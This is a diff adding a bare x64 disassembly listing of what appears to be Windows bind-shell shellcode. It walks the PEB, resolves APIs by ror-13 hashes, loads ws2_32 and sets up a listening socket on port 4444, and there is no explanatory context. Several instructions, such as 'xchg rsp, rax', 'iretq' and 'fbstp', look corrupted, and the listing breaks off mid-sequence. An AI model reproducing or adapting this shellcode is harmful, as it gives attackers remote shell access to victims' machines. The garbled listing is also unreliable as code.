@@ -1,0 +1,136 @@
+0: cld 
+1: and rsp, 0xfffffffffffffff0
+8: call 0xd9
+13: push r9
+15: push r8
+17: push rdx
+18: xor rdx, rdx
+21: mov rdx, qword ptr gs:[rdx + 0x60]
+26: mov rdx, qword ptr [rdx + 0x18]
+30: mov rdx, qword ptr [rdx + 0x20]
+34: push rcx
+35: mov edi, 0x1274de0f
+40: xchg rsp, rax
+42: push rsi
+44: adc ecx, dword ptr gs:[rdx]
+47: sub eax, eax
+49: movzx rcx, word ptr [rdx + 0x4a]
+54: xor r9, r9
+57: mov rsi, qword ptr [rdx + 0x50]
+61: xor rax, rax
+64: lodsb al, byte ptr [rsi]
+65: cmp al, 0x61
+67: jl 0x47
+69: jne 0xffffffffffffffc9
+71: sub al, 0x20
+73: ror r9d, 0xd
+77: add r9d, eax
+80: loop 0x3f
+82: push rdx
+83: mov rdx, qword ptr [rdx + 0x20]
+87: push r9
+89: mov eax, dword ptr [rdx + 0x3c]
+92: add rax, rdx
+95: cmp word ptr [rax + 0x18], 0x20b
+101: jne 0xdd
+107: mov eax, dword ptr [rax + 0x88]
+113: test rax, rax
+116: je 0xdd
+118: add rax, rdx
+121: push rax
+122: mov r8d, dword ptr [rax + 0x20]
+126: mov ecx, dword ptr [rax + 0x18]
+129: add r8, rdx
+132: jrcxz 0xdc
+134: xor r9, r9
+137: dec rcx
+140: mov esi, dword ptr [r8 + rcx*4]
+144: add rsi, rdx
+147: xor rax, rax
+150: lodsb al, byte ptr [rsi]
+151: ror r9d, 0xd
+155: add r9d, eax
+158: cmp al, ah
+160: jne 0x93
+162: add r9, qword ptr [rsp + 8]
+167: cmp r9d, r10d
+170: jne 0x84
+172: pop rax
+173: mov r8d, dword ptr [rax + 0x24]
+177: add r8, rdx
+180: mov cx, word ptr [r8 + rcx*2]
+185: mov r8d, dword ptr [rax + 0x1c]
+189: add r8, rdx
+192: mov eax, dword ptr [r8 + rcx*4]
+196: pop r8
+198: pop r8
+200: add rax, rdx
+203: pop rsi
+204: pop rcx
+205: pop rdx
+206: pop r8
+208: pop r9
+210: pop r10
+212: sub rsp, 0x20
+216: push r10
+218: jmp rax
+220: pop rax
+221: pop r9
+223: pop rdx
+224: mov rdx, qword ptr [rdx]
+227: jmp 0x33
+232: pop rbp
+233: movabs r14, 0x32335f327377
+243: push r14
+245: mov r14, rsp
+248: sub rsp, 0x1a0
+255: mov r13, rsp
+258: xor rax, rax
+261: push rax
+262: push rax
+263: mov r12, 0x5c110002
+270: push r12
+272: mov r12, rsp
+275: mov rcx, r14
+278: mov r10d, 0x726774c
+284: call rbp
+286: mov rdx, r13
+289: push 0x101
+294: pop rcx
+295: mov r10d, 0x6b8029
+301: call rbp
+303: push 2
+305: pop rcx
+306: push rax
+307: push rax
+308: xor r9, r9
+311: xor r8, r8
+314: inc rax
+317: mov rdx, rax
+320: mov r10d, 0xe0df0fea
+326: call rbp
+328: cmp dh, byte ptr [rdi]
+330: jae 0x118
+332: and esp, ebp
+334: iretq 
+336: mov rdi, rax
+339: push 0x10
+341: pop r8
+343: mov rdx, r12
+346: mov rcx, rdi
+349: mov r10d, 0x6737dbc2
+355: call rbp
+357: xor rdx, rdx
+360: mov rcx, rdi
+363: mov r10d, 0xff38e9b7
+369: call rbp
+371: xor r8, r8
+374: xor rdx, rdx
+377: or bl, bl
+380: mov rcx, rdi
+383: mov r10d, 0xe13bec74
+389: call rbp
+391: mov rcx, rdi
+394: mov rdi, rax
+397: mov r10d, 0x614d6e75
+403: fbstp tbyte ptr [rdx]
